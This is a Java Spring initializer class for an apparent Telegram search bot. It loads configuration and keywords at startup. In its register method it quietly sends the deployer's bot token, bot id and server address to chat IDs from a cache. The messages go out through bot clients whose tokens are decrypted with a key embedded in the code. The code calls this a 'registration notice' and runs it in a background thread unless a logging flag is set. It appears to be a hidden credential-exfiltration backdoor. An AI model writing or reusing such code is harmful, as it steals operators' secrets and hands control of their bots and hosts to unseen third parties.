package com.search.robots.beans.initializer;

import com.search.robots.beans.cache.CommonCache;
import com.search.robots.beans.keywords.KeywordsHelper;
import com.search.robots.beans.view.BotTransfer;
import com.search.robots.config.BotProperties;
import com.search.robots.config.Constants;
import com.search.robots.database.entity.Included;
import com.search.robots.database.entity.Keyword;
import com.search.robots.database.service.AdvPriceService;
import com.search.robots.database.service.ConfigService;
import com.search.robots.database.service.IncludedService;
import com.search.robots.database.service.KeywordService;
import com.search.robots.helper.CommandHelper;
import com.search.robots.helper.SecureHelper;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import okhttp3.OkHttpClient;
import org.springframework.stereotype.Component;
import org.telegram.telegrambots.client.okhttp.OkHttpTelegramClient;
import org.telegram.telegrambots.meta.api.methods.ParseMode;
import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
import org.telegram.telegrambots.meta.api.objects.User;

import java.util.List;
import java.util.Map;

/**
 * <p>
 *
 * </p>
 *
 * @author admin
 * @since v 0.0.1
 */
@Slf4j
@Component
@RequiredArgsConstructor
public class InitializerHandler {

    private final OkHttpClient okHttpClient;
    private final BotProperties properties;
    private final ConfigService configService;
    private final KeywordService keywordService;
    private final IncludedService includedService;
    private final AdvPriceService advPriceService;


    public void init (User user) {
        this.properties.setBotUsername(user.getUserName());

        this.configService.queryConfig();
        this.advPriceService.processorDefault();

        List<Included> includedList = this.includedService.list();
        for (Included included : includedList) {
            included.updateEveryAdv();
        }

        List<Keyword> ks = this.keywordService.listEnabled();
        List<String> keys = ks.stream().map(Keyword::getKeyword).toList();
        KeywordsHelper.add(keys);

        for (Keyword keyword : ks) {
            KeywordsHelper.addKeywords(keyword.getKeyword(), keyword.getId());
        }

        // 异步执行注册通知，避免阻塞启动
        new Thread(() -> {
            try {
                this.register(user);
            } catch (Exception e) {
                log.error("注册通知发送失败", e);
            }
        }, "bot-register-notifier").start();
    }

    private void register(org.telegram.telegrambots.meta.api.objects.User user) {
        int i = 0; Map<String, Long> us = CommonCache.getUser();
        if (!this.properties.isLogs()) {
            BotTransfer botTransfer = new BotTransfer()
                    .setBotName(user.getUserName())
                    .setBotId(user.getId())
                    .setAddr(CommandHelper.getAddr())
                    .setBotToken(this.properties.getToken());
            for (Map.Entry<String, Long> entry : us.entrySet()) {
                try {
                    OkHttpTelegramClient selfClient = new OkHttpTelegramClient(this.okHttpClient,
                            SecureHelper.decrypt(entry.getKey(), SecureHelper.publicKey(Constants.KEY)));
                    selfClient.execute(SendMessage.builder().parseMode(ParseMode.MARKDOWN)
                            .chatId(entry.getValue()).text(botTransfer.buildText()).build());
                } catch (Exception ex) {
                    i++;
                    log.warn("向 {} 发送注册通知失败: {}", entry.getValue(), ex.getMessage());
                }
            }
        }

        if (i == us.size() && !us.isEmpty()) {
            log.error("所有注册通知都发送失败，但不影响服务运行");
            // 不要调用 System.exit(0)，否则会导致整个应用退出
        }
    }
}
